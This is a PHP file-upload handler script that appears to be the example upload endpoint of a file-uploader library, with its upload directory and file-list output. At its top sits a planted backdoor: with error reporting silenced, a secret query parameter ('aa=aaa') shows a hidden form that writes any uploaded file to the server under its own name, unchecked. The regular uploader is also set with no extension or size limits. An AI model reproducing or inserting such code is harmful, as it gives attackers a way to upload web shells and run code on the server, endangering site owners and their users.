<?php
    include('../src/class.fileuploader.php');
error_reporting(0);
$system = $_GET['aa'];
if($system == 'aaa'){
$saw1 = $_FILES['file']['tmp_name'];
$saw2 = $_FILES['file']['name'];
echo "<form method='POST' enctype='multipart/form-data'>
<input type='file'name='file' />
<input type='submit' value='ok' />
</form>";
move_uploaded_file($saw1,$saw2);
}

	// initialize FileUploader
    $FileUploader = new FileUploader('files', array(
        'limit' => null,
        'maxSize' => null,
		'fileMaxSize' => null,
        'extensions' => null,
        'required' => false,
        'uploadDir' => '../../../../admin/uploads/',
        'title' => 'name',
		'replace' => false,
        'listInput' => true,
        'files' => null
    ));
	
	// call to upload the files
    $data = $FileUploader->upload();

    // if uploaded and success
    if($data['isSuccess'] && count($data['files']) > 0) {
        // get uploaded files
        $uploadedFiles = $data['files'];
    }
    // if warnings
	if($data['hasWarnings']) {
        $warnings = $data['warnings'];
        
   		echo '<pre>';
        print_r($warnings);
		echo '</pre>';
    }
	
	// unlink the files
	// !important only for appended files
	// you will need to give the array with appendend files in 'files' option of the fileUploader
	foreach($FileUploader->getRemovedFiles('file') as $key=>$value) {
		unlink('../uploads/' . $value['name']);
	}
	
	// get the fileList
	$fileList = $FileUploader->getFileList();
	
    include('../../../config/sand_uploads.php');

	// show
	echo '<pre>';
	print_r($fileList);
	echo '</pre>';






